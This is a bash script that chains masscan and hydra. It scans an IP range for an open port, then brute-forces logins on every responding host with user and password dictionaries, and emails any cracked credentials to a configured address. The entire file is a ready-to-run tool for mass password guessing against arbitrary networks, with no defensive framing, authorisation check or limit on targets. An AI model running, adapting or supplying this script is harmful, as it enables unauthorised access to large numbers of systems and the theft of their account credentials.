#!/bin/bash

Title=""
Message="Over"

echo "Usage: ./brute.sh ip port server userdic passdic"

target_scan="targets/scan"
target_rslt="targets/rslt"
ip=${1}
port=${2}
server=${3}
user_dic=${4}
pass_dic=${5}

mail="yourmailaddress"
scan_name=${ip%/*}"_"${port}".scan"
rslt_name=${ip%/*}"_"${port}".rslt"

if [ ! -d "targets" ]
then
    mkdir "targets"
fi

if [ ! -d ${target_scan}"/"${port} ]
then
    if [ ! -d ${target_scan} ]
    then
        mkdir ${target_scan}
    fi
    mkdir ${target_scan}"/"${port}
fi

if [ ! -d ${target_rslt}"/"${port} ]
then
        if [ ! -d ${target_rslt} ]
        then
                mkdir ${target_rslt}
        fi
    mkdir ${target_rslt}"/"${port}
fi

Scan="masscan -p "${port}" --range "${ip}" -oL "${target_scan}"/"${port}"/"${scan_name}
Burp="hydra "${server}"  -M "${target_scan}"/"${port}"/"${scan_name}".ip -L "${user_dic}" -P "${pass_dic}" -V -o "${target_rslt}"/"${port}"/"${rslt_name}" -s "${port}

echo "Start scanning:"
echo ${Scan}
${Scan}

declare -i s_count
s_count=`cat ${target_scan}"/"${port}"/"${scan_name} |grep -c -v "#"`

if [ $s_count == 0 ]
then
    Title=${ip}":"${port}" no ports open"
    Message="Failed"
    echo ${Message}" "${Title}
    echo ${Message} | mutt -s ${Title} ${mail}
    exit -1
else
    if [ ! -d ${target_rslt}"/"${port} ]
    then
            mkdir ${target_rslt}"/"${port}
    fi

    echo "Dealing....."
    cat ${target_scan}"/"${port}"/"${scan_name} | grep "open" | awk {'print $4'} | awk  {'print $1'} > ${target_scan}"/"${port}"/"${scan_name}".ip"
    echo "Burping:"
    echo ${Burp}
    ${Burp}
    if [ ! -f ${target_rslt}"/"${port}"/"${rslt_name} ]
    then
        Title=${ip}":"${port}"Nothing"
        Message="ALL "${s_count}", got none."
            echo ${Message}" "${Title}
            echo ${Message} | mutt -s ${Title} `echo ${mail}`
        exit -1
    else
        declare -i c_count
        c_count=0
        echo ${Title}
        c_count=`cat ${target_rslt}"/"${port}"/"${rslt_name} |grep -c -v "#"`
        if [ ${c_count} != 0 ]
        then
            Title=${ip}":"${port}"Luckey！"
            else
            Title=${ip}":"${port}"Nothing！"
        fi
        Message="Scanned："${s_count}" get:"${c_count}"！"
        echo ${Message}" "${Title}
            echo ${Message} | mutt -s ${Title} ${mail} -a ${target_rslt}"/"${port}"/"${rslt_name}
        exit 0
    fi
fi
